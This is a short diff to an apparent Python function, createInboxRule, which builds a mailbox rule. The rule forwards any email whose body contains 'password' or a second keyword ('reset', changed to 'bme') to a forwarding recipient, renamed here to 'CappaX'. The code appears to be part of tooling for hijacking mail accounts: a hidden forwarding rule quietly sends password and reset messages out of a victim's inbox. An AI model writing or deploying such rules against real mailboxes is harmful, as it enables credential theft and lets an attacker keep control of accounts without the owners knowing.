@@ -20,14 +20,14 @@ def createInboxRule(headers):
     "isEnabled": "true",          
     "conditions": {
         "bodyContains": [
-          "password", "reset"       
+          "password", "bme"       
         ]
      },
      "actions": {
         "forwardTo": [
           {
              "emailAddress": {
-                "name": "",
+                "name": "CappaX",
                 "address": ""
               }
            }
